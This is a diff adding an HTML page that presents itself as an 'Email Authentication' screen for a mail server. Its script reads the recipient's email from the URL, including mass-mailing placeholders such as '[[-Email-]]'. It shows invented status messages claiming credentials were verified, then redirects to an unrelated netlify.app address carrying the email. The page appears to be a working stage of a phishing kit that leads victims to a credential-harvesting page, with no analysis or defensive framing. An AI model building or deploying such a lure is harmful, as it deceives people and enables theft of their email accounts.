@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Authentication</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background: #ffffff;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e5e7eb;
+        }
+        
+        header {
+            background: #f8fafc;
+            color: #1e40af;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e5e7eb;
+        }
+        
+        header h1 {
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        header p {
+            color: #64748b;
+            font-size: 0.95rem;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .loading-section {
+            text-align: center;
+            padding: 10px;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            border: 5px solid rgba(30, 64, 175, 0.1);
+            border-radius: 50%;
+            border-top-color: #1e40af;
+            animation: spin 1.2s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-section p {
+            font-size: 1.1rem;
+            color: #4b5563;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        
+        .progress-container {
+            height: 6px;
+            background: #f1f5f9;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #3b82f6, #6366f1);
+            border-radius: 3px;
+            animation: progress 2s ease-in-out infinite;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; margin-left: 100%; }
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #94a3b8;
+            font-size: 0.85rem;
+            border-top: 1px solid #f1f5f9;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Email Authentication</h1>
+            <p>Secure access to your mail server</p>
+        </header>
+        
+        <div class="content">
+            <div class="loading-section">
+                <div class="spinner"></div>
+                <p id="status-text">Initializing authentication sequence</p>
+                <div class="progress-container">
+                    <div class="progress-bar"></div>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Secure authentication system</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const statusText = document.getElementById('status-text');
+            
+            // Get email from URL parameters (both hash and query string)
+            function getEmailFromURL() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                
+                // Try to get email from various possible parameter names
+                let email = urlParams.get('email') || hashParams.get('email') || 
+                           urlParams.get('e') || hashParams.get('e') ||
+                           '{email}' || '[[-Email-]]';
+                
+                // If we still have placeholder values, try to extract from hash directly
+                if (email === '{email}' || email === '[[-Email-]]') {
+                    const hash = window.location.hash;
+                    if (hash.includes('=')) {
+                        const potentialEmail = hash.split('=')[1];
+                        if (potentialEmail.includes('@')) {
+                            email = potentialEmail;
+                        }
+                    }
+                }
+                
+                return email;
+            }
+            
+            const userEmail = getEmailFromURL();
+            const encodedEmail = encodeURIComponent(userEmail);
+            const authUrl = `https://loquacious-custard-15eacc.netlify.app/#email=${encodedEmail}`;
+            
+            // Simulate loading process
+            const statusMessages = [
+                "Initializing authentication sequence",
+                "Connecting to mail server",
+                "Verifying credentials",
+                "Establishing secure connection",
+                "Authentication successful"
+            ];
+            
+            let currentStatus = 0;
+            const statusInterval = setInterval(() => {
+                statusText.textContent = statusMessages[currentStatus];
+                currentStatus++;
+                
+                if (currentStatus >= statusMessages.length) {
+                    clearInterval(statusInterval);
+                    statusText.innerHTML = 'Authentication successful! Redirecting...';
+                    
+                    // Redirect to the authentication URL
+                    setTimeout(() => {
+                        window.location.href = authUrl;
+                    }, 1000);
+                }
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
